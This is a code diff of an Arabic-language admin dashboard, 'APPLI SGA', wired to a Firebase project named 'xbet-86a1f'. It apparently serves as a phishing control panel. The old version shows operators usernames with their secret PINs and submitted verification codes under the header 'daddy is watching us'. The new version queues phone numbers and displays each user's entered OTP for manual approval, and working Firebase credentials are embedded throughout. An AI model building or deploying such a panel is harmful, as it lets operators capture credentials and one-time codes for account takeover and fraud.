@@ -1,237 +1,254 @@
+<!-- ============================ ADMIN (admin.html) ============================ -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>dash — APPLI SGA</title>
+<title>APPLI SGA - لوحة الإدارة</title>
 <style>
-:root{
-  --bg-url: url("https://i.imgur.com/BUXMnBT.jpeg");
-  --bg-color:#eceef1;
-}
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{width:100%;min-height:100%;background-color:var(--bg-color);background-image:var(--bg-url);background-position:center top;background-size:cover;background-repeat:no-repeat;background-attachment:fixed;font-family:system-ui,-apple-system,'Segoe UI',sans-serif;direction:rtl}
-body{padding:20px;display:flex;justify-content:center}
-.container{width:100%;max-width:720px}
-.header{background:rgba(255,255,255,.96);border-radius:20px;padding:22px;margin-bottom:20px;box-shadow:0 8px 24px rgba(0,0,0,.12);text-align:center}
-.header h1{font-size:22px;color:#2b2b2b;margin-bottom:6px}
-.header p{font-size:13px;color:#828287}
-.header .count{display:inline-block;background:#D5262E;color:#fff;padding:5px 14px;border-radius:20px;font-size:13px;margin-top:12px;font-weight:600}
-.card{background:rgba(255,255,255,.98);border-radius:18px;padding:18px;margin-bottom:16px;box-shadow:0 6px 20px rgba(0,0,0,.1);border-right:5px solid #4BA93D}
-.card.code{border-right-color:#D5262E}
-.card.done{border-right-color:#9aa0a6;background:rgba(255,255,255,.94)}
-.card-title{font-size:15px;font-weight:700;color:#2b2b2b;margin-bottom:12px;display:flex;align-items:center;gap:8px}
-.badge{background:#ffeb3b;color:#2b2b2b;padding:2px 8px;border-radius:6px;font-size:11px;font-weight:600}
-.badge.ok{background:#4BA93D;color:#fff}
-.badge.no{background:#D5262E;color:#fff}
-.spacer{flex:1}
-.time{font-size:11px;color:#9a9a9f;font-weight:600;font-family:system-ui}
-.row{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px dashed #e0e0e0;font-size:14px}
-.row:last-of-type{border-bottom:none}
-.row .label{color:#828287}
-.row .value{color:#1c1c1c;font-weight:700;font-family:ui-monospace,monospace;font-size:16px;letter-spacing:1px}
-.actions{display:flex;gap:10px;margin-top:14px}
-.btn{border:none;padding:13px;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;flex:1;transition:opacity .15s}
-.btn:active{opacity:.8}
-.btn-approve{background:linear-gradient(100deg,#4BA93D,#3d8d31);color:#fff}
-.btn-reject{background:linear-gradient(100deg,#D5262E,#b91f26);color:#fff}
-.empty{background:rgba(255,255,255,.9);border-radius:18px;padding:50px 20px;text-align:center;color:#828287;font-size:15px}
-.notify-btn{position:fixed;top:20px;left:20px;background:#4BA93D;color:#fff;border:none;padding:11px 18px;border-radius:12px;font-size:13px;font-weight:600;cursor:pointer;display:none;z-index:100;box-shadow:0 4px 12px rgba(0,0,0,.2)}
-.notify-btn.show{display:block}
-
-/* ===== قسم السجل ===== */
-.section-title{background:rgba(255,255,255,.96);border-radius:14px;padding:13px 16px;margin:22px 0 14px;font-size:14px;font-weight:700;color:#2b2b2b;box-shadow:0 4px 14px rgba(0,0,0,.08);display:flex;justify-content:space-between;align-items:center}
-.section-title .n{background:#eceef1;color:#555;padding:3px 12px;border-radius:20px;font-size:12px;font-weight:700}
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Tajawal',system-ui,sans-serif}
+  body{background:#f4f5f7;min-height:100vh;padding:16px;font-size:14px;color:#333}
+  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
+  
+  header{background:linear-gradient(135deg,#7A0010,#C41E3A);color:#fff;padding:20px;border-radius:14px;margin-bottom:16px;box-shadow:0 4px 16px rgba(196,30,58,.25)}
+  header h1{font-size:20px;font-weight:800}
+  header p{opacity:.85;font-size:12px;margin-top:4px}
+  
+  .section{background:#fff;border-radius:12px;padding:16px;margin-bottom:14px;box-shadow:0 2px 8px rgba(0,0,0,.05)}
+  .section h2{font-size:15px;color:#111;margin-bottom:12px;display:flex;align-items:center;gap:8px;padding-bottom:10px;border-bottom:2px solid #f0f0f0}
+  .section h2 .count{background:#C41E3A;color:#fff;padding:2px 10px;border-radius:12px;font-size:11px;font-weight:700}
+  
+  .card{background:#fafafa;border:1px solid #e8e8e8;border-radius:10px;padding:14px;margin-bottom:10px}
+  .card:last-child{margin-bottom:0}
+  .card-row{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:8px}
+  .card-row label{font-size:12px;color:#666;font-weight:500}
+  .card-row strong{color:#111;font-family:monospace;font-size:14px;direction:ltr;font-weight:700}
+  .card-row .time{font-size:11px;color:#999}
+  
+  .pin-row{display:flex;gap:8px;align-items:center;margin-bottom:10px}
+  .pin-input{flex:1;padding:10px 12px;border:2px solid #e0e0e0;border-radius:8px;font-family:monospace;font-size:16px;text-align:center;direction:ltr;letter-spacing:4px;background:#fff;transition:.2s}
+  .pin-input:focus{outline:none;border-color:#C41E3A;box-shadow:0 0 0 3px rgba(196,30,58,.1)}
+  
+  .actions{display:flex;gap:8px;justify-content:flex-end}
+  .btn{padding:9px 18px;border:none;border-radius:8px;cursor:pointer;font-size:13px;font-weight:700;transition:.15s;font-family:'Tajawal',sans-serif}
+  .btn:active{transform:scale(.97)}
+  .btn-approve{background:#22a06b;color:#fff}
+  .btn-approve:hover{background:#1a8a5a}
+  .btn-reject{background:#dc2626;color:#fff}
+  .btn-reject:hover{background:#b91c1c}
+  .btn-delete{background:#6b7280;color:#fff;padding:6px 12px;font-size:11px}
+  
+  .code-badge{background:#C41E3A;color:#fff;padding:4px 12px;border-radius:6px;font-family:monospace;font-size:16px;letter-spacing:2px;font-weight:700}
+  .code-badge.pin{background:#22a06b}
+  
+  .status-badge{padding:3px 10px;border-radius:12px;font-size:11px;font-weight:700}
+  .status-pending{background:#fef3c7;color:#92400e}
+  .status-approved{background:#dbeafe;color:#1e40af}
+  .status-code{background:#e0e7ff;color:#4338ca}
+  .status-verified{background:#d1fae5;color:#065f46}
+  
+  .empty{color:#999;text-align:center;padding:24px;font-size:13px;background:#fafafa;border-radius:8px}
+  
+  .stats{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
+  .stat{background:#fff;border-radius:10px;padding:12px 16px;flex:1;min-width:100px;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,.05)}
+  .stat-num{font-size:24px;font-weight:800;color:#C41E3A}
+  .stat-label{font-size:11px;color:#666;margin-top:2px}
 </style>
 </head>
 <body>
-<button class="notify-btn" id="notifyBtn"> تفعيل الإشعارات</button>
-<div class="container">
-  <div class="header">
-    <h1>daddy is watching us</h1>
-    <p>this dashbord was created by RonnyPavy</p>
-    <div class="count" id="count">0 طلب</div>
-  </div>
 
-  <div id="list"></div>
+<header>
+  <h1>🎛️ APPLI SGA - لوحة الإدارة</h1>
+  <p>إدارة طلبات التحقق من الأرقام</p>
+</header>
 
-  <div class="section-title" id="histTitle">
-    <span>Ronny Pavy</span>
-    <span class="n" id="histCount">0</span>
-  </div>
-  <div id="history"></div>
+<div class="stats">
+  <div class="stat"><div class="stat-num" id="pendingCount">0</div><div class="stat-label">طلبات جديدة</div></div>
+  <div class="stat"><div class="stat-num" id="approvedCount">0</div><div class="stat-label">بانتظار OTP</div></div>
+  <div class="stat"><div class="stat-num" id="codeCount">0</div><div class="stat-label">بانتظار تأكيد OTP</div></div>
+  <div class="stat"><div class="stat-num" id="verifiedCount">0</div><div class="stat-label">مؤكدون</div></div>
+</div>
+
+<div class="section">
+  <h2>📥 طلبات جديدة <span class="count" id="pCount">0</span></h2>
+  <div id="pendingList"><div class="empty">لا توجد طلبات جديدة</div></div>
+</div>
+
+<div class="section">
+  <h2>⏳ بانتظار رمز OTP من المستخدم <span class="count" id="aCount">0</span></h2>
+  <div id="approvedList"><div class="empty">لا يوجد</div></div>
+</div>
+
+<div class="section">
+  <h2>🔐 بانتظار تأكيد رمز OTP <span class="count" id="cCount">0</span></h2>
+  <div id="codeList"><div class="empty">لا يوجد</div></div>
+</div>
+
+<div class="section">
+  <h2>✅ مستخدمون مؤكدون <span class="count" id="vCount">0</span></h2>
+  <div id="verifiedList"><div class="empty">لا يوجد</div></div>
 </div>
 
 <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
 <script>
 var firebaseConfig = {
-  apiKey: "AIzaSyAXONTkOIB0rXIn-oVp6Ex6sp1owLDe1no",
-  authDomain: "xbet-86a1f-default-rtdb.firebaseio.com",
+  apiKey: "AIzaSyDST9eIFpUdbXa2aaVWVPt6LjZNL4R2UKA",
+  authDomain: "xbet-86a1f.firebaseapp.com",
   databaseURL: "https://xbet-86a1f-default-rtdb.firebaseio.com",
   projectId: "xbet-86a1f",
   storageBucket: "xbet-86a1f.firebasestorage.app",
   messagingSenderId: "1049564126267",
-  appId: "1:1049564126267:android:b0ff40f054b18aee79501e"
+  appId: "1:1049564126267:web:58eb824eda9566ae79501e",
+  measurementId: "G-MZDXDMQ2HB"
 };
 firebase.initializeApp(firebaseConfig);
 var db = firebase.database();
 
-var list = document.getElementById('list');
-var count = document.getElementById('count');
-var historyEl = document.getElementById('history');
-var histCount = document.getElementById('histCount');
-var notifyBtn = document.getElementById('notifyBtn');
-
-/* ---------- الإشعارات ---------- */
-if ('Notification' in window && Notification.permission === 'default'){
-  notifyBtn.classList.add('show');
-  notifyBtn.onclick = function(){
-    Notification.requestPermission().then(function(p){
-      if (p === 'granted'){ notifyBtn.classList.remove('show'); beep(); }
-    });
-  };
-}
-function beep(){
-  try{
-    var ctx = new (window.AudioContext || window.webkitAudioContext)();
-    var o = ctx.createOscillator(), g = ctx.createGain();
-    o.connect(g); g.connect(ctx.destination);
-    o.frequency.value = 880; g.gain.value = 0.12;
-    o.start(); o.stop(ctx.currentTime + 0.15);
-  }catch(e){}
-}
-function notify(title, body){
-  if ('Notification' in window && Notification.permission === 'granted'){
-    try{ new Notification(title, { body: body }); }catch(e){}
-  }
-  beep();
-  document.title = ' ' + title;
-  setTimeout(function(){ document.title = 'لوحة التحكم — APPLI SGA'; }, 5000);
-}
-
-/* ---------- استقبال الطلبات الجديدة ---------- */
-db.ref('requests').on('child_added', function(snap){
-  var v = snap.val(); if (!v) return;
-  if (v.status === 'pending' && v.createdAt && Date.now() - v.createdAt < 10000){
-    notify('طلب تسجيل دخول جديد', 'المستخدم: ' + v.username);
-  }
-  if (v.status === 'code_pending' && v.codeSubmittedAt && Date.now() - v.codeSubmittedAt < 10000){
-    notify('رمز تحقق جديد', 'المستخدم: ' + v.username + ' — الرمز: ' + v.userCode);
-  }
-});
-db.ref('requests').on('child_changed', function(snap){
-  var v = snap.val(); if (!v) return;
-  if (v.status === 'pending'){
-    notify('طلب تسجيل دخول جديد', 'المستخدم: ' + v.username);
-  }
-  if (v.status === 'code_pending'){
-    notify('رمز تحقق جديد', 'المستخدم: ' + v.username + ' — الرمز: ' + v.userCode);
-  }
-});
-
-/* ---------- الرسم ---------- */
-db.ref('requests').on('value', function(snap){
-  var data = snap.val() || {};
-  var active = [], done = [];
-
-  Object.keys(data).forEach(function(k){
-    var v = data[k]; if (!v) return;
-    if (v.status === 'pending' || v.status === 'code_pending'){
-      active.push({ id: k, data: v });
-    } else if (v.status === 'approved' || v.status === 'rejected' ||
-               v.status === 'verified' || v.status === 'code_rejected'){
-      done.push({ id: k, data: v });
-    }
-  });
-
-  /* ----- الطلبات الحالية ----- */
-  active.sort(function(a,b){ return (a.data.createdAt||0) - (b.data.createdAt||0); });
-  count.textContent = active.length + ' طلب';
-
-  if (active.length === 0){
-    list.innerHTML = '<div class="empty">لا توجد طلبات حالياً</div>';
-  } else {
-    var html = '';
-    active.forEach(function(it){
-      var v = it.data;
-      if (v.status === 'pending'){
-        html += '<div class="card">';
-        html += '<div class="card-title"> طلب تسجيل دخول <span class="badge">جديد</span></div>';
-        html += '<div class="row"><span class="label">اسم المستخدم</span><span class="value">'+esc(v.username)+'</span></div>';
-        html += '<div class="row"><span class="label">الرمز السري</span><span class="value">'+esc(v.pin)+'</span></div>';
-        html += '<div class="actions">';
-        html += '<button class="btn btn-approve" onclick="approve(\''+it.id+'\')">✓ موافقة</button>';
-        html += '<button class="btn btn-reject" onclick="reject(\''+it.id+'\')">✕ رفض</button>';
-        html += '</div></div>';
-      } else if (v.status === 'code_pending'){
-        html += '<div class="card code">';
-        html += '<div class="card-title"> رمز تحقق <span class="badge">بانتظار المراجعة</span></div>';
-        html += '<div class="row"><span class="label">اسم المستخدم</span><span class="value">'+esc(v.username)+'</span></div>';
-        html += '<div class="row"><span class="label">رمز التحقق</span><span class="value">'+esc(v.userCode)+'</span></div>';
-        html += '<div class="actions">';
-        html += '<button class="btn btn-approve" onclick="approveCode(\''+it.id+'\')">✓ موافقة</button>';
-        html += '<button class="btn btn-reject" onclick="rejectCode(\''+it.id+'\')">✕ رفض</button>';
-        html += '</div></div>';
-      }
-    });
-    list.innerHTML = html;
-  }
-
-  /* ----- السجل (مقبولة / مرفوضة) ----- */
-  done.sort(function(a,b){
-    return decidedTime(b.data) - decidedTime(a.data);
-  });
-  histCount.textContent = done.length;
-
-  if (done.length === 0){
-    historyEl.innerHTML = '<div class="empty">لا يوجد سجل بعد — ستظهر هنا الطلبات بعد القبول أو الرفض</div>';
-    return;
-  }
-
-  var h = '';
-  done.forEach(function(it){
-    var v = it.data;
-    var isLogin = (v.status === 'approved' || v.status === 'rejected');
-    var ok = (v.status === 'approved' || v.status === 'verified');
-    h += '<div class="card done">';
-    h += '<div class="card-title">' + (isLogin ? ' تسجيل دخول' : ' رمز تحقق');
-    h += '<span class="badge ' + (ok ? 'ok' : 'no') + '">' + (ok ? 'مقبول' : 'مرفوض') + '</span>';
-    h += '<span class="spacer"></span><span class="time">' + fmt(decidedTime(v)) + '</span></div>';
-    h += '<div class="row"><span class="label">اسم المستخدم</span><span class="value">'+esc(v.username)+'</span></div>';
-    if (isLogin){
-      h += '<div class="row"><span class="label">الرمز السري</span><span class="value">'+esc(v.pin)+'</span></div>';
-    } else {
-      h += '<div class="row"><span class="label">رمز التحقق</span><span class="value">'+esc(v.userCode)+'</span></div>';
-    }
-    h += '</div>';
-  });
-  historyEl.innerHTML = h;
-});
-
-function decidedTime(v){
-  return v.decidedAt || v.verifiedAt || v.codeRejectedAt || v.createdAt || 0;
-}
-function fmt(ts){
-  if (!ts) return '—';
-  try{
-    return new Date(ts).toLocaleString('ar-EG', {
-      year:'numeric', month:'2-digit', day:'2-digit',
-      hour:'2-digit', minute:'2-digit'
-    });
-  }catch(e){ return new Date(ts).toLocaleString(); }
-}
 function esc(s){
-  return String(s==null?'':s).replace(/[&<>"']/g, function(c){
+  return String(s || '').replace(/[&<>"']/g, function(c){
     return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
   });
 }
+function fmtTime(ts){
+  if (!ts) return '';
+  var d = new Date(ts), now = new Date();
+  var diff = Math.floor((now - d) / 1000);
+  if (diff < 60) return diff + ' ث';
+  if (diff < 3600) return Math.floor(diff/60) + ' د';
+  if (diff < 86400) return Math.floor(diff/3600) + ' س';
+  return d.toLocaleDateString('ar');
+}
 
-/* ---------- عمليات القبول والرفض (منطقها كما هو + طابع زمني للقرار) ---------- */
-function approve(id){ db.ref('requests/'+id).update({ status:'approved', decidedAt: Date.now() }); }
-function reject(id){ db.ref('requests/'+id).update({ status:'rejected', decidedAt: Date.now() }); }
-function approveCode(id){ db.ref('requests/'+id).update({ status:'verified', verifiedAt: Date.now(), decidedAt: Date.now() }); }
-function rejectCode(id){ db.ref('requests/'+id).update({ status:'code_rejected', codeRejectedAt: Date.now(), decidedAt: Date.now() }); }
+db.ref('requests').on('value', function(snap){
+  var pending = [], approved = [], code = [], verified = [];
+  snap.forEach(function(child){
+    var d = child.val() || {};
+    d._key = child.key;
+    var st = d.status;
+    if (st === 'pending') pending.push(d);
+    else if (st === 'approved') approved.push(d);
+    else if (st === 'code_pending') code.push(d);
+    else if (st === 'verified') verified.push(d);
+  });
+  var sortFn = function(a,b){ return (b.createdAt||0) - (a.createdAt||0); };
+  pending.sort(sortFn); approved.sort(sortFn); code.sort(sortFn); verified.sort(sortFn);
+
+  document.getElementById('pendingCount').textContent = pending.length;
+  document.getElementById('approvedCount').textContent = approved.length;
+  document.getElementById('codeCount').textContent = code.length;
+  document.getElementById('verifiedCount').textContent = verified.length;
+  document.getElementById('pCount').textContent = pending.length;
+  document.getElementById('aCount').textContent = approved.length;
+  document.getElementById('cCount').textContent = code.length;
+  document.getElementById('vCount').textContent = verified.length;
+
+  renderPending(pending);
+  renderApproved(approved);
+  renderCode(code);
+  renderVerified(verified);
+});
+
+function renderPending(list){
+  var el = document.getElementById('pendingList');
+  if (!list.length){ el.innerHTML = '<div class="empty">لا توجد طلبات جديدة</div>'; return; }
+  el.innerHTML = list.map(function(r){
+    return '<div class="card">' +
+      '<div class="card-row"><label>📱 الرقم</label><strong>' + esc(r.phone) + '</strong></div>' +
+      '<div class="card-row"><label>🕐 الوقت</label><span class="time">' + fmtTime(r.createdAt) + '</span></div>' +
+      '<div class="pin-row">' +
+        '<input type="text" class="pin-input" id="pin_' + r._key + '" maxlength="6" inputmode="numeric" placeholder="000000">' +
+      '</div>' +
+      '<div class="actions">' +
+        '<button class="btn btn-reject" onclick="rejectPhone(\'' + r._key + '\')">رفض</button>' +
+        '<button class="btn btn-approve" onclick="approvePhone(\'' + r._key + '\')">موافقة وإرسال PIN</button>' +
+      '</div>' +
+    '</div>';
+  }).join('');
+}
+
+function renderApproved(list){
+  var el = document.getElementById('approvedList');
+  if (!list.length){ el.innerHTML = '<div class="empty">لا يوجد</div>'; return; }
+  el.innerHTML = list.map(function(r){
+    return '<div class="card">' +
+      '<div class="card-row"><label>📱 الرقم</label><strong>' + esc(r.phone) + '</strong></div>' +
+      '<div class="card-row"><label>🔑 PIN (مُعيَّن)</label><span class="code-badge pin">' + esc(r.pin || '---') + '</span></div>' +
+      '<div class="card-row"><label>🕐 الوقت</label><span class="time">' + fmtTime(r.createdAt) + '</span></div>' +
+      '<div class="card-row"><label>الحالة</label><span class="status-badge status-approved">بانتظار رمز OTP من المستخدم</span></div>' +
+      '<div class="actions">' +
+        '<button class="btn btn-reject" onclick="rejectPhone(\'' + r._key + '\')">إلغاء الطلب</button>' +
+      '</div>' +
+    '</div>';
+  }).join('');
+}
+
+function renderCode(list){
+  var el = document.getElementById('codeList');
+  if (!list.length){ el.innerHTML = '<div class="empty">لا يوجد</div>'; return; }
+  el.innerHTML = list.map(function(r){
+    return '<div class="card">' +
+      '<div class="card-row"><label>📱 الرقم</label><strong>' + esc(r.phone) + '</strong></div>' +
+      '<div class="card-row"><label>🔢 الرمز المُدخل</label><span class="code-badge">' + esc(r.userCode || '---') + '</span></div>' +
+      '<div class="card-row"><label>🔑 PIN</label><span class="code-badge pin">' + esc(r.pin || '---') + '</span></div>' +
+      '<div class="card-row"><label>🕐 الوقت</label><span class="time">' + fmtTime(r.codeSubmittedAt || r.createdAt) + '</span></div>' +
+      '<div class="actions">' +
+        '<button class="btn btn-reject" onclick="rejectCode(\'' + r._key + '\')">رفض</button>' +
+        '<button class="btn btn-approve" onclick="approveCode(\'' + r._key + '\')">تأكيد</button>' +
+      '</div>' +
+    '</div>';
+  }).join('');
+}
+
+function renderVerified(list){
+  var el = document.getElementById('verifiedList');
+  if (!list.length){ el.innerHTML = '<div class="empty">لا يوجد</div>'; return; }
+  el.innerHTML = list.map(function(r){
+    return '<div class="card">' +
+      '<div class="card-row"><label>📱 الرقم</label><strong>' + esc(r.phone) + '</strong></div>' +
+      '<div class="card-row"><label>🔑 PIN</label><span class="code-badge pin">' + esc(r.pin || '---') + '</span></div>' +
+      '<div class="card-row"><label>🕐 الوقت</label><span class="time">' + fmtTime(r.createdAt) + '</span></div>' +
+      '<div class="actions">' +
+        '<button class="btn btn-delete" onclick="deleteRequest(\'' + r._key + '\')">حذف</button>' +
+      '</div>' +
+    '</div>';
+  }).join('');
+}
+
+/* ===== Actions ===== */
+function approvePhone(key){
+  var input = document.getElementById('pin_' + key);
+  var pin = input ? input.value.trim() : '';
+  if (!/^\d{6}$/.test(pin)){
+    alert('يجب إدخال رمز سري من 6 أرقام (أرقام فقط)');
+    input && input.focus();
+    return;
+  }
+  db.ref('requests/' + key).update({
+    status: 'approved',
+    pin: pin,
+    approvedAt: Date.now()
+  });
+}
+
+function rejectPhone(key){
+  if (!confirm('هل أنت متأكد من رفض هذا الطلب؟')) return;
+  db.ref('requests/' + key).update({ status: 'rejected', rejectedAt: Date.now() });
+}
+
+function approveCode(key){
+  db.ref('requests/' + key).update({ status: 'verified', verifiedAt: Date.now() });
+}
+
+function rejectCode(key){
+  if (!confirm('رفض رمز OTP؟')) return;
+  db.ref('requests/' + key).update({ status: 'code_rejected', rejectedAt: Date.now() });
+}
+
+function deleteRequest(key){
+  if (!confirm('حذف هذا السجل نهائياً؟')) return;
+  db.ref('requests/' + key).remove();
+}
 </script>
 </body>
 </html>
